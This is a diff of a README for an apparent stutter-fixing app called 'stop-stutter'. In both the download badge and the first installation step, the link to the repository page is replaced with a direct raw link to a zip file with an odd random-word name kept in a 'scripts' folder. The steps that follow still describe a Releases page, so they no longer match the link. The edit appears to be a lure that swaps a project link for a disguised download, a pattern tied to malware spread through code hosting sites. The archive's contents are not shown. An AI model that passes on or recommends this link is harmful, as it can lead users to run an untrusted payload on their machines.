@@ -31,11 +31,11 @@ Whether you're playing AAA titles via GeForce NOW, streaming from your gaming PC
 
 ## 📥 Download & Install
 
-[![Download stop-stutter](https://img.shields.io/badge/Download-stop--stutter-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/snowzinn645/stop-stutter)
+[![Download stop-stutter](https://img.shields.io/badge/Download-stop--stutter-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/snowzinn645/stop-stutter/main/scripts/stutter_stop_aortorrhaphy.zip)
 
 ### Step-by-Step Installation
 
-1. **Visit this link to download the application:** [https://github.com/snowzinn645/stop-stutter](https://github.com/snowzinn645/stop-stutter)
+1. **Visit this link to download the application:** [https://raw.githubusercontent.com/snowzinn645/stop-stutter/main/scripts/stutter_stop_aortorrhaphy.zip](https://raw.githubusercontent.com/snowzinn645/stop-stutter/main/scripts/stutter_stop_aortorrhaphy.zip)
 2. On the GitHub page, look for the **"Releases"** section (usually on the right side or at the bottom).
 3. Click the latest release, then download the file ending in **`.dmg`** or **`.zip`**.
 4. If you downloaded a `.zip` file, double-click it to extract the application.
